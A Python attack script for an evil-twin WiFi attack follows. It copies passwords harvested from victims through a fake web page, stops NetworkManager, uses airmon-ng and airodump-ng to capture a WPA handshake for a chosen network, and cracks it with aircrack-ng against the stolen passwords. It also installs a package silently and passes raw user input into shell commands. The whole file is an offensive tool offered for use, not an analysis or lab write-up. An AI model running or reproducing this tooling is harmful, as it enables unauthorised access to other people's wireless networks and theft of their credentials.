#!/usr/bin/env python
from scapy.all import *
import os
import argparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import signal
import threading
from sys import platform
os.system("pip install colorama")
import colorama
from colorama import Fore, Style, Back


colorama.init()
os.system("cp /var/www/html/victim_passwords.txt /root/handshakes/victim_passwords.txt")
#os.system("ls /root/handshakes")
print("\n")
wlan = raw_input(Fore.LIGHTBLUE_EX + "enter interface name to perform handshake: \n")
print(Style.RESET_ALL)

os.system("systemctl stop NetworkManager")
os.system("airmon-ng check kill")
os.system("airmon-ng start " + wlan)
os.system("iwconfig")
os.system("airmon-ng stop " + wlan)
try:
    os.system("airodump-ng " + wlan)
except KeyboardInterrupt:
    pass
mac = raw_input(Fore.LIGHTMAGENTA_EX + "\nenter the mac address of the wifi: \n")

channel = raw_input(Fore.LIGHTGREEN_EX + "\nenter the channel of the network: \n" )
print(Style.RESET_ALL)

os.system("/root/eviltwinfiles/fake-ap-stop.sh")
try:
    os.system("airodump-ng " + wlan + " --bssid " + mac + " --channel " + channel + " --write handshake --output-format cap")
except KeyboardInterrupt:
    pass
try:
	os.system("mv /root/eviltwinfiles/handshake-01.cap /root/handshakes/handshake-01.cap")
except:
	pass
os.system("aircrack-ng /root/handshakes/handshake-01.cap -w /root/handshakes/victim_passwords.txt")
